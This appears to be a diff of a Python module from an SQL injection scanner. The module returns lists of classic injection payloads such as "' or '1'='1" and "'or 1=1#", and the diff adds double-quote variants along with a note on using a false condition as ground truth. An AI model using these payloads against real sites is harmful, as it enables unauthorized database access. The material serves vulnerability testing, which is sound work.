@@ -11,11 +11,13 @@ match = re.findall(r'<ins>.+', compare_res)
 
 3. add another label "' or '1'='1" as ground truth
 Assumption: should be the same page for sql injection, different with false page
+singel quote and double quote is not fixed yet.
 """
 
 def get_false():
 	## the second is taken as ground truth to filter out real sql-injection page
-	payloads = ["' and '1=2", "' or '1'='1"]
+	# payloads = ["' and '1=2", "' or '1'='1", '" or "1"="1']
+	payloads = ["' and '1=2",'" or "1"="1', "' or '1'='1"]
 	return payloads
 ''''
 
@@ -36,7 +38,7 @@ def get_all():
 	"""
 	## temp test
 	# payloads = ["' or '1=1"]
-	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", "' OR '1=1 %00"]
+	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", "' OR '1=1 %00", '" or "1=1']
 	payloads = [(item, "SQL Injection") for item in payloads]
 	return payloads	
 
